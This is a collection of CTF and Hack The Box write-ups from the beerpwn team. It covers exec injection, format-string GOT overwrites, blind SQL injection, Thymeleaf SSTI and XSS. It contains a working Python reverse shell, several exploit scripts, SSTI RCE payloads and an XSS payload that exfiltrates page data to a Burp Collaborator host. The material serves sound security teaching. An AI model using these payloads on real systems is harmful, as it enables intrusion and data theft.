| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 02 Dec 2019 15:31:58
|     Server: BadHTTPServer
|     Last-Modified: Mon, 02 Dec 2019 15:31:58
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     ...
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ok, not many ports open, so let's look to the web service.
It seems there's not much stuff on it and scrolling the main page to the bottom it seems there's some useful information:

![webpage](./webpage.png)

The developer talks about a file _SuperSecureServer.py_, it's important and should be memorized.
As first check it's better to look if there is some basic and guessable virtual host on the web server by changing the _Host_ header in a HTTP request.
It seems that after some tries the server replies always the same thing so it's better to look other places.

Let's enumerate dirs and files of the web application.
The main page is an html page so I use it in the extensions list with, php (just because I'm not sure what the backend is really) and py, related to the script named by them.
I always add at least extensions like txt,bak,tar,zip,dat to don't miss any notes, changelog, backup and so on.  
With a scan of directories "`wfuzz -u http://10.10.10.168:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt`", also with a slash appended at the end and with a list of extensions "`wfuzz -u http://10.10.10.168:8080/FUZZ.FUZ2Z -w /usr/share/wordlists/dirb/dig.txt -z list,html,php,py,txt,bak,dat`" I've found.. Nothing! No dir, no file, other than the index.html!

But, I have an important information, the name of the script.
Maybe it's inside a subdirectory of the site (I checked the root and it isn't there). Note that I filter by status code response, in general I prefer to filter on the characters count, but the name of the resource it's reflected in the response.

![wfuzz](./wfuzz_develop.png)

Ohh god it found it in the __/develop/__ folder.
The dir can't be found without appending the script's name because the server doesn't reply in a different way like with a 403 response code.
By the way grab immediately that python.. I love python. Let's dig into it and look at this piece of code (the full file is [here](./SuperSecureServer.py)).

```(python)
    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
```

Ohh an `exec`! Exec like eval is evil! It takes its argument and interprets it as python code.
The script uses it on the URL path location of the HTTP request to format the final string contained in the `info` variable, after an URL-decode.  
There's no check, and there is no doubt, this can be exploited!  
To break into the machine I use the following oneline python reverse shell:
```(python)
import pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.39",55666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```
And I encode it in base64 `echo -n '...' | base64 -w0` . Note that the packages socket,subprocess,os are already imported by the script and it can be avoided in the payload. Then I can trigger the command execution by embed the base64 of the above code in the following payload as URL of a GET request:
```
/405.html'%2bexec(__import__("base64").b64decode("PAYLOAD"))%2b'
```

Yes, this is that moment when you g0t a sh3ll!

![rce](./rce.png)

With a reverse shell as _www-data_ the next target is the __robert__ user.
Inside its directory (word readable) there are some interesting files.
The _check.txt_ is: `Encrypting this file with your key should result in out.txt, make sure your key is correct!` and it's the plaintext of _out.txt_.
The full code of the [SuperSecureCrypt.py is here](./SuperSecureCrypt.py) but I summarize the encryption step as: _p is a character in plaintext and keyChr a char in key  ==>  encrypted += chr((ord(p) + ord(keyChr)) % 255)_  
It's a modular arithmetic sum "`c=p+k mod 255`" and the decryption is "`p=c-k mod 255`".  
The user provides us the ciphertext, the plaintext and not the key. Thanks to the modular arithmetic properties from the decryption expression I have "`k = c - p mod 255`" and this means that if I use the decryption code with the plaintext, instead the key, I obtain the key! (maybe repeted n times)

```
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -d -i ./out.txt -o /tmp/.text -k "`cat check.txt`"
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file ./out.txt...
Decrypting...
Writing to /tmp/.text...
www-data@obscure:/home/robert$ cat /tmp/.text
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
```

Yes! The key it's __alexandrovich__ and now I use this to decrypt the _passwordreminder.txt_ file.

```(bash)
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -d -i ./passwordreminder.txt -o /tmp/.text -k "alexandrovich"
...
www-data@obscure:/home/robert$ cat /tmp/.text
SecThruObsFTW

www-data@obscure:/home/robert$ su - robert
Password: SecThruObsFTW

robert@obscure:/home/robert$
```

Ok take the _user.txt_, move to ssh and it's time of root.  
Before a linenum I check the setuid binaries and there's nothing strange, then check my sudoers permissions with `sudo -l`:

```(bash)
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

Well, robert can run as root without typing any password the [BetterSSH.py](./BetterSSH.py) script, another python, nice!
The full script is readable [here](./BetterSSH.py), I put below the interesting part:

```(python)
    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)
    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
```

Basically, the script it is an interactive shell that requires the user to authenticate himself with credentials and like the real daemon it uses the users passwords saved on the system.
It checks if the password (hashed) provided by the user match the hash stored on the system by reading the `/etc/shadow` file.
The script saves the hashes  in a file with a random name in the `/tmp/SSH/` directory.

Summary: I can use it as root and it will successfully load the shadow file, it will load the root hash from shadow and it will save it in a temporary file that is readable and in this moment I can steal it.  
The exploit could be made in bash, or in keeping with the box theme, in python!!
This is my [exploit.py](./exploit.py), that tries to exploit the race condition:
```
#!/usr/bin/python

import glob
import time

res = glob.glob('/tmp/SSH/*')
while len(res) == 0:
    time.sleep(0.02)
    res = glob.glob('/tmp/SSH/*')
with open(res[0], 'r') as f:
    data = f.read()
    print(data)
```

![hashroot](./hashroot.png)

By taking the first hash, of the root user, it can be cracked with john and the rockyou.txt wordlist: `john -wordlist=/usr/share/wordlist/rockyou.txt tocrack`. Finally the password of root is __mercedes__ .

![root](./root.png)

r00t d4nce!

Thanks for reading! Thanks to the creator [clubby789](https://www.hackthebox.eu/profile/83743) and to Hack The Box.  
If you like this write up, or just to discuss about it write me on [twitter](https://twitter.com/bytevsbyt3).  
If there is some mistake please tell me!



### File: ctf/README.md

# beerpwn cyber security team

Capturing the flags since the 2018, 1 flag - 1 beer!  
We are friends who met at the university and passionate about hacking, from Turin, Italy.  
We work as penetration tester.

Official site: [beerpwn.it](http://beerpwn.it/)

In this repository you can find a collection of CTF writeups, of challenges and of Boot-to-Root machines.  
The details about CVEs that have been assigned to us were moved [here](https://github.com/beerpwn/CVE) ;)


## Beerpwn team members

[__bytevsbyte__](https://twitter.com/bytevsbyt3 "bytevsbyte")

[__p4w__](https://twitter.com/p4w16 "p4w")

[__sk4__](https://twitter.com/sk4pwn "sk4")

[__vl4dmole__](./)

[__0n4me__](https://twitter.com/0n4me)



### File: ctf/2019/INS'Hack_ctf/gimme_your_shell/description.md

Someone is always asking me the same question when I try to find his secret. Can you answer his question and get his secret ? I can handle it.

He is waiting for you at: `ssh -i <your_keyfile> -p 2225 user@gimme-your-shell.ctf.insecurity-insa.fr`
To find your keyfile, look into your profile on this website.

[binary](https://static.ctf.insecurity-insa.fr/de3560ce34d9bd8e7555cf409bca7ecdd3dbe86b.tar.gz)


### File: ctf/2019/redpwn_ctf/black_echo/Readme.md

# WRITEUP BLACK ECHO (blind format string)

## __Author:__ bytevsbyte @ beerpwn team

There wasn't any executable to download, just a service running on the server.\
When I tried to connect with netcat and send some bytes, the server replied echoing my input.\
Then I sent some "%p" to check if it was a format string vulnerability.
It returned some pointer in hexadecimal and I was sure
it was a format string.. a blind format string!!

## DUMP THE EXECUTABLE

The idea was to steal a big part of the executable to find interesting stuff and addresses.
I used the "%s" in the format string to print out some bytes
from memory starting at a specific address.
The printf evaluate the string and when it finds the first %s
it takes the pointer after the format string (is 32 bits, so it's on the stack).\
Find exactly the location of the target argument (address that the %s refers to)
it's a bit tricky and using directly the %s it's a pain.
It's easier trying first without the %s,
with something like "AAAA %p %p %p %p...",
counting how many __characters__/__bytes__ come first
the 0x41414141 in the output, that is the right offset to reach the AAAA
(a future memory address).\
To verify the offset can be used also the %OFFSET$p (where OFFSET is a number).

![Image find the offset](./first_output_offset.png)

There is only one problem if the pointer is at the start of a format string,
the NULL byte (0x00).
The printf quit after a NULL byte and it won't trigger the last part of the format string.
So I changed a bit the layout moving the "AAAA" to the end after the %p
and fixing the offset value (yes it changes).

Finally I could replace the AAAA with a real interesting address as a
starting point to access the code section memory.
The starting address is fixed, stored into the ELF header
and it doesn't changed at loading time because
it wasn't compiled with the PIE option.\
A correct address can be found with a quick search on internet about
_"entry point address"_ or looking at an other 32-bit ELF with
__`readelf -h EXECUTABLE`__.\
Then the address could be incremented in a loop by the number
of useful bytes received from the server.

```(python)
#!/usr/bin/python
#-*- coding: utf-8 -*-

from pwn import *

s = remote('chall.2019.redpwn.net', 4007)
start = 0x08048000
addr = start
binfile = ''
while addr < (start + 4096):
    if '0a' in hex(addr):
        addr += 1
        binfile += '\x00'
    try:
        print('[+] %s:' % hex(addr))
        s.sendline('AA.%10$s.BB' + '\x00' + p32(addr))
        data = s.recv(128)
        data = data[data.find('AA.')+3:data.find('.BB')]
        binfile += data + '\x00'
        addr += len(data) + 1
    except Exception as e:
        print('[-] Exception: ' + str(e))
        with open('binfile', 'w') as f:
            f.write(binfile)
        s.close()
        s = remote('chall.2019.redpwn.net', 4007)
s.close()
with open('binfile', 'w') as f:
    f.write(binfile)
```

In the loop I just skipped the addresses with "\n" because the input
function (fgets) use it to finish reading the buffer.
The script stops after 4 KiloBytes.. I checked that I received something
useful running __`file binfile`__ that printed
_`"ELF 32-bit LSB executable, Intel 80386"`_. Great!\
The binary file it's not perfect (due to the addresses skipped containing 0x0a) but this is not a problem, with a bit of fortune
when some stuff is missing,
you don't have to execute it but just do some static
analysis, like looking for address and understanding the code layout.

## EXPLOIT
This executable it's quite easy to understand with a tool
like ghidra, hopper or r2. There aren't any buffer overflow, but there are always the printf in loop. The main instructions from the dump in
decompiled C (with ghidra):

```(c)
do {
    fgets(local_1014, 0x1000, *(FILE **)PTR_stdin_08049ff8);
    printf(local_1014);
} while( true );
```

I had to identify which libc the server use. I used the format string
in the same way as before, but using as target address
the GOT array of different functions (setbuf, printf and fgets).
With these addresses (last 12 bit) I identified the libc used
with the libc-database tool and after I found the address of libc.

```(bash)
~/libc-database# ./find setbuf 450 printf 020 fgets 620
ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
archive-glibc (id libc6-i386_2.23-0ubuntu11_amd64)
~/libc-database# ./dump libc6-i386_2.23-0ubuntu10_amd64 system
offset_system = 0x0003a940
```

My idea was to exploit this binary using the first round of format string
to get a leak of an address and bypass the ASLR.
Then, in the second round,
replace the pointer of the printf in the GOT with the system!\
The printf it's the perfect target in this case because it's used (bad)
with only one parameter that is the string read from the input,
and I didn't need to change the code flow.
Finally, at the last round of input I could pass a "/bin/sh" string
to the input and the code will call the system instead the printf,
passing it the string just read.

The final exploit:

```(python)
#!/usr/bin/python
#-*- coding: utf-8 -*-

import struct
from pwn import *

got_setbuf  = 0x804a00c
got_printf  = 0x804a010
got_fgets   = 0x804a014
offset_printf   = 0x49020
offset_system   = 0x3a940

# LEAK => setbuf(450) printf(020) fgets(620)
payload = 'AA.%10$s.BB' + '\x00' + p32(got_printf)
s = remote('chall.2019.redpwn.net', 4007)
s.sendline(payload)
data = s.recv(128)
data = data[data.find('AA.')+3:data.find('.BB')]
libc_base = struct.unpack("I", data[4:8])[0] - offset_printf
system = libc_base + offset_system
print('[+] libc base: ' + hex(libc_base))
print('[+]    system: ' + hex(system))

# EXPLOITATION
lw = system & 0x0000ffff
uw = (system & 0xffff0000) >> 16
fmtstr  = '%' + str(lw) + 'x'           # >6
fmtstr += '%14$hn'                      # >12
fmtstr += '%' + str(uw-lw) + 'x'        # >18
fmtstr += '%15$hn'                      # >24
fmtstr += '\x00' * (len(fmtstr) % 4)
s.sendline(fmtstr + p32(got_printf) + p32(got_printf+2))
data = s.recv(4096)
s.interactive()
s.send('////bin/sh')
s.close()
```

## Flag time

![Image of flag](./output_flag.png)

After I got the shell I took the source code file
that can be useful to recompile (_`gcc -m32 code.c -o bin`_) a working
executable and try it in local.



### File: ctf/2020/Houseplant_CTF/web/readme.md


* Exploiting a blind command injection to extract flag.txt contens



### File: ctf/2020/SuSeC_CTF/pwn/unary/readme.md

![alt chal_desc](./chall_desc.png)

### Author: p4w
### Twitter: @p4w16

Running the binary:
```
$ ./unary
0. EXIT
1. x++
2. x--
3. ~x
4. -x
Operator: 1
x = 5
f(x) = 6
0. EXIT
1. x++
2. x--
3. ~x
4. -x
Operator:
```

Disassemble of main():
```
0x0040080f      call    show_menu  ; sym.show_menu
0x00400814      mov     rdi, rbp
0x00400817      call    read_int   ; sym.read_int
0x0040081c      mov     ebx, eax
0x0040081e      test    eax, eax
0x00400820      je      0x400855
0x00400822      mov     rdi, r14
0x00400825      call    read_int   ; sym.read_int
0x0040082a      sub     ebx, 1
0x0040082d      movsxd  rbx, ebx
0x00400830      mov     rsi, r13
0x00400833      mov     edi, eax
0x00400835      call    qword [r12 + rbx*8]
```
Disassemble of read_int():
```
0x0040079e      sub     rsp, 0x18
0x004007a2      mov     rdx, rdi   ; arg1
0x004007a5      lea     rsi, [0x00400916]
0x004007ac      mov     edi, 1
0x004007b1      mov     eax, 0
0x004007b6      call    __printf_chk ; sym.imp.__printf_chk
0x004007bb      lea     rsi, [var_ch]
0x004007c0      lea     rdi, [0x00400919] ; const char *format
0x004007c7      mov     eax, 0
0x004007cc      call    __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
0x004007d1      cmp     eax, 1     ; rdx
0x004007d4      je      0x4007e0
0x004007d6      mov     edi, 0     ; int status
0x004007db      call    exit       ; sym.imp.exit ; void exit(int status)
0x004007e0      mov     eax, dword [var_ch]
0x004007e4      add     rsp, 0x18
0x004007e8      ret
```

The first call to `read_int()` read our input using `__isoc99_scanf()` and the rexult got stored in `eax` (0x004007e0), after that the contents of `eax` got transferred into `ebx` (0x0040081c).
The vulnerable line reside in 0x00400835 of `main()` func, as we can see it does a `call qword [r12 + rbx*8]` and we can control the `rbx` register with our input (our input is used as an offsett to a function pointer).
The sencond input we can pass to the program, will be the argument to the func. pointer (look at instruction addr. 0x00400833).<br>
How we can abuse this behavior?<br>
Passing an offsett (our first input) and trick the programm to make a call instruction on __puts@GOT__ to leak libc address, then use same method to call ____isoc99_scanf@GOT__ with a `"%s"` argument to gain stack buffer overflow. From there we can just use __ROP__ to gain a shell.<br>
The exploit is available <a href='./x.py'>here</a>



### File: ctf/2020/VirSecCon_CTF/web/eyeless/note.md

* find a trivial blind-SQLi in login

* dump the db with sqlmap:
```
  $ sqlmap -r ./asdf.req.txt --risk=3 --level=5 -p username --technique=BT --dbms=mysql --random-agent --dump
          ___
         __H__
   ___ ___["]_____ ___ ___  {1.4.4#stable}
  |_ -| . [,]     | .'| . |
  |___|_  [.]_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org

  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

  [*] starting @ 20:16:44 /2020-04-04/

  [20:16:44] [INFO] parsing HTTP request from './asdf.req.txt'
  [20:16:44] [INFO] fetched random HTTP User-Agent header value 'Opera/9.20(Windows NT 5.1; U; en)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
  [20:16:44] [INFO] testing connection to the target URL
  sqlmap resumed the following injection point(s) from stored session:
  ---
  Parameter: username (POST)
      Type: boolean-based blind
      Title: OR boolean-based blind - WHERE or HAVING clause (subquery - comment)
      Payload: username=-6303' OR 3925=(SELECT (CASE WHEN (3925=3925) THEN 3925 ELSE (SELECT 7853 UNION SELECT 5260) END))-- -&password=asdf

      Type: time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
      Payload: username=tamper' AND (SELECT 9635 FROM (SELECT(SLEEP(5)))xIne)-- ngVq&password=asdf
  ---
  [20:16:44] [INFO] testing MySQL
  [20:16:45] [INFO] confirming MySQL
  [20:16:45] [INFO] the back-end DBMS is MySQL
  web server operating system: Linux Ubuntu
  web application technology: Apache 2.4.7, PHP 5.5.9
  back-end DBMS: MySQL >= 5.0.0
  [20:16:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
  [20:16:45] [INFO] fetching current database
  [20:16:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
  [20:16:45] [INFO] retrieved: eyeless
  [20:16:52] [INFO] fetching tables for database: 'eyeless'
  [20:16:52] [INFO] fetching number of tables for database 'eyeless'
  [20:16:52] [INFO] retrieved: 1
  [20:16:53] [INFO] retrieved: users
  [20:16:58] [INFO] fetching columns for table 'users' in database 'eyeless'
  [20:16:59] [INFO] retrieved: 2
  [20:17:00] [INFO] retrieved: username
  [20:17:08] [INFO] retrieved: password
  [20:17:16] [INFO] fetching entries for table 'users' in database 'eyeless'
  [20:17:16] [INFO] fetching number of entries for table 'users' in database 'eyeless'
  [20:17:16] [INFO] retrieved: 1
  [20:17:17] [INFO] retrieved: LLS{blind_sql_injection_cant_be_done_with_braille}
  [20:18:13] [INFO] retrieved: admin
  Database: eyeless
  Table: users
  [1 entry]
  +----------+----------------------------------------------------+
  | username | password                                           |
  +----------+----------------------------------------------------+
  | admin    | LLS{blind_sql_injection_cant_be_done_with_braille} |
  +----------+----------------------------------------------------+

  [20:18:18] [INFO] table 'eyeless.users' dumped to CSV file '/home/p4w/.sqlmap/output/jh2i.com/dump/eyeless/users.csv'
  [20:18:18] [INFO] fetched data logged to text files under '/home/p4w/.sqlmap/output/jh2i.com'

  [*] ending @ 20:18:18 /2020-04-04/
```



### File: ctf/2020/angstrom_CTF/pwn/pwn_120/readme.md

## Angstrom CTF 2020
### pwn challenge 120 pti
### Author: p4w

* We have a format string vuln.<br>
* Use the fmt string to leak address of __libc__ and one address of the __stack__
* Calculating the offsett between the __leakaed stack address__ and the __saved ret address__
* ovewritten __ret address__ with __one_gadget__.

<a href="./exp.py">Exploit</a> here.



### File: ctf/2021/aero_CTF/web/Localization_is_hard/readme.md

## Aero CTF 2021
### Author: p4w @ [beerpwn](https://beerpwn.it)
### Twitter https://twitter.com/p4w16

## Challenge description (Web category)
![alt img](chall-desc.PNG)

## TL;DR
__Server Side Template Injection__ on __Thymeleaf__ template engine to gain __RCE__.

## Solution
### Discovery of the vuln
The challenge description says that the site is __available in english and russian__, this probably is written to point the attention to something involving the language.
Also the challenge description tell that the flag should be located at `/` on the file system, this make me think that it is necessary to gain at least an __arbitrary file read__ or __RCE__ to get the flag.
By inspection the site it is possible to notice that we can choose the language by clicking on a button.
As it is possible to notice that when the button is clicked (`onclick` event), then the `set_language(lang)` function will be executed.

![alt img](site.PNG)

![alt img](js.PNG)

The function simply set a cookie named __lang__ with the values __en__ or __ru__ and then reload the page.
Let's inspect the requests with burp-proxy.

![alt img](normal-req.PNG)

The first thing that I tried during the CTF, was to modify the cookie with some simple directory traversal payloads.

![alt img](dir_trav_3.PNG)

![alt img](dir_trav_1.PNG)

![alt img](dir_trav_2.PNG)

The directory traversal seems working, but if we try to include some arbitrary file (such as __/etc/passwd__) we got a __500 internal server error__. The error is verbose enough to show the server side exception: __org.thymeleaf.exceptions.TemplateInputException__ and
by googling this error, I come across to this template engine: [thymeleaf](https://www.thymeleaf.org/).

![alt img](thymeleaf.PNG)

The exception thrown seems to be related to loading the template, and that smells like __SSTI__ to me. So I start searching for __SSTI on Thymeleaf__ and I discovered a couple of related articles:
* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)
* [https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability)

### Exploitation
Reading these articles, we can see that it may be possible to do template injection in __Thymeleaf__ if _a template name or a fragment are concatenated with untrusted data_.
To get a better explanation and details I really council the readers to read the articles mentioned before.
The proposed payloads to gain __RCE__ are these:

* `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("<cmd-here>").getInputStream()).next()}__::.x`
* `${T(java.lang.Runtime).getRuntime().exec('<cmd-here>')}`

At this point I simply tried one of these payloads into the __lang__ cookie with a command such as `wget <webhook-endpoint>` to verify the __command execution__
and it worked __:=)__.

![alt img](rce-poc-2.PNG)

Now I had __RCE__, since the flag was located at __/__, I needed some way to enumerate the file system contents and extract the flag. Problem was that it was not possible to use all the bash functionality such us `|, &, $, ...`. I also tried to extract or write files with `wget`, but no luck with that solution.
To summarize I had the ability to run commands, but no way to build a payload (__time based__ or __OOB__) that allow me to extract the output of an arbitrary command.
At this point I start to read the __thymeleaf__ [documentation](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html) and some [Java-doc](https://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletResponse.html) for Java objects, the basic idea that I had was to insert the output of the executed command directly into the __response__, for example by using a crafted HTTP header response with the output. After a bit of pain, I was able to build this payload: `__${#response.setHeader("cmd-out","test")}__::.x` and it worked __:)__!\
*[the above payload should work well on __Thymeleaf 3.0__, probably for __Thymeleaf 2.1__ could be: `__${#ctx.httpServletResponse.setHeader("cmd-out","test")}__::.x`]

![alt img](thymeleaf-doc.PNG)

![alt img](javadoc.PNG)

![alt img](set-header.png)

Now that we have the ability to modify the response, I simply played a bit with the Java-doc to build a payload that reads the output of the command and save it into the crafted header.
The final payload:
```
__${#response.setHeader(\"cmd-out\",#uris.escapeQueryParam(new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(\"ls\").getInputStream())).lines().toArray()[0]))}__::.x
```
This payload will execute the `ls` command, read the first line, url-encode it and insert in the `cmd-header` of the HTTP response.

[Here](./x.py) you can download a simple python script that I made during the CTF to automate all of these steps and read all the lines of the executed command.

![alt img](script-run.PNG)

That's all folks, I think that was really an interesting challenge!\
Cheers, [p4w](https://twitter.com/p4w16) =)



### File: ctf/2022/Codegate_CTF/web/web_cafe/readme.md

## CAFE - Web Challenge
![alt desc](./chal-des.png)

## Author: p4w

### Solution
The first step was to discover a trivial XSS vulnerability on the `/search?text=<XSS>` path.
The problem is that we can't submit this page directly to the admin, as it will only visit content on the `/read` path.

![alt desc](./trivial_XSS_in_search_page.png)

These are the functionality offered from the web-application:
* read a post
* write a post
* search post
* list all post
* report a post to the admin

By analyzing the source code we can spot that if the post contents have some html tag, then the application will try to sanitize it. The sanitize is done by parsing the user input and allowing only certain tags, in addiction some manipulation on the allowed tags is done. The pictures below show the behaviour of the web application.
![alt desc](./src-filter.png)

So here I immediately think that if we manage to point the __src__ attribute of an __iframe__ tag to the `/search?text=<XSS>` endpoint we can exploit the trivial XSS previously found. The problem is to bypass this check:
```
case 'iframe':
  $src = $element->src;
  $host = parse_url($src)['host'];
  if (strpos($host, 'youtube.com') !== false){
    $result .= '<iframe src="'. str_replace('"', '', $src) .'"></iframe>';
  }
  break;
```

By doing manual fuzzing, I was able to spot a discrepancy between the `parse_url()` __php function__ and the __src__ loading for an html element.
![alt desc](diff.png)

In green is highlighted the part that will be considered the host by the __src__ attribute, instead in __red__ is highlighted the part that is considered the host by the parse_url function.

The figure below shows the different behavior.

__parse_url()__ behavior:

![alt desc](bypass-parse_url-2.png)

__src__ behavior:

![alt desc](bypass-parse_url-poc-1.png)

__src__ behavior in browser:

![alt desc](bypass-parse_url-poc.png)

Now we have a way to bypass the filter since we can submit a payload containing an __iframe__ tag that let the __parse_url__ function return "youtube.com" as required, but when it is loaded from the browser it will point to the vulnerable endpoint.
To grab the flag we need to get the contents of a post submitted by the admin.

XSS payload to steal page contents:
```
<script>var url = "http://3.39.55.38:1929/read?no=1";
var attacker = "http://w419dzeivpt6tx3s1i8eg901rsxil7.burpcollaborator.net/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);</script>
```


Final and full payload:
```
<iframe src="http://3.39.55.38:1929\@youtube.com/../search?text=%3c%73%63%72%69%70%74%3e%76%61%72%20%75%72%6c%20%3d%20%22%68%74%74%70%3a%2f%2f%33%2e%33%39%2e%35%35%2e%33%38%3a%31%39%32%39%2f%72%65%61%64%3f%6e%6f%3d%31%22%3b%0a%76%61%72%20%61%74%74%61%63%6b%65%72%20%3d%20%22%68%74%74%70%3a%2f%2f%77%34%31%39%64%7a%65%69%76%70%74%36%74%78%33%73%31%69%38%65%67%39%30%31%72%73%78%69%6c%37%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%65%78%66%69%6c%22%3b%0a%76%61%72%20%78%68%72%20%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%78%68%72%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%69%66%20%28%78%68%72%2e%72%65%61%64%79%53%74%61%74%65%20%3d%3d%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%2e%44%4f%4e%45%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%61%74%74%61%63%6b%65%72%20%2b%20%22%3f%22%20%2b%20%65%6e%63%6f%64%65%55%52%49%28%62%74%6f%61%28%78%68%72%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%29%29%29%0a%20%20%20%20%7d%0a%7d%0a%78%68%72%2e%6f%70%65%6e%28%27%47%45%54%27%2c%20%75%72%6c%2c%20%74%72%75%65%29%3b%0a%78%68%72%2e%73%65%6e%64%28%6e%75%6c%6c%29%3b%3c%2f%73%63%72%69%70%74%3e">
```

Here you can see the exfiltration of the page containing the flag:
![alt desc](exfil-flag.png)

## Reference
* [Exploiting-URL-Parsing-Confusion.pdf](https://claroty.com/wp-content/uploads/2022/01/Exploiting-URL-Parsing-Confusion.pdf)
* [Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

